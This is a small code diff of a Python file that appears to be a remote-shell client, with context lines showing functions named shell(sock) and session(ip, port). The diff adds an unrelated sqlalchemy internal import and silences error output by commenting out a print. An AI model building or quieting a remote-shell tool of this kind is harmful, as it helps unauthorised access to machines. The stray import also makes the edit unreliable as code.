@@ -6,6 +6,7 @@ import platform
 import subprocess
 from time import sleep
 import requests
+from sqlalchemy.ext.declarative.api import _stateful_declared_attr
 
 
 def shell(sock):
@@ -28,7 +29,7 @@ def session(ip, port):
         shell(sock)
 
     except Exception as err:
-        print(err)
+        #print(err)
         return 0
 
 
